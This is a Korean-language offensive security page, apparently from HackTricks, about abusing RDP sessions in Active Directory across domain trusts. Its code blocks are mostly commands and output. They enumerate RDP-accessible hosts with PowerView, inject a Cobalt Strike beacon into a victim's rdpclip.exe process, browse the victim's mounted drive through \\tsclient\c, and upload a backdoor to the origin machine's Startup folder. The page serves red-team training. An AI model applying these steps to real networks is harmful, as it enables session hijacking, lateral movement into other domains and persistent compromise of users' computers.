# RDP 세션 악용

{{#include ../../banners/hacktricks-training.md}}

## RDP 프로세스 주입

만약 **외부 그룹**이 현재 도메인의 어떤 **컴퓨터**에 **RDP 접근** 권한이 있다면, **공격자**는 **그 컴퓨터를 손상시키고 그를 기다릴 수 있습니다**.

해당 사용자가 RDP를 통해 접근하면, **공격자는 그 사용자의 세션으로 전환하여** 외부 도메인에서 그 권한을 악용할 수 있습니다.
```powershell
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Check **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

사용자가 **RDP를 통해 머신에 접근**할 때, **공격자**가 그를 **기다리고** 있다면, 공격자는 **사용자의 RDP 세션에 비콘을 주입**할 수 있으며, 만약 **희생자가 RDP를 통해 접근할 때 자신의 드라이브를 마운트**했다면, **공격자는 그것에 접근할 수 있습니다**.

이 경우, **희생자의** **원래 컴퓨터**를 **백도어**를 **시작 폴더**에 작성하여 **타락**시킬 수 있습니다.
```powershell
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
{{#include ../../banners/hacktricks-training.md}}
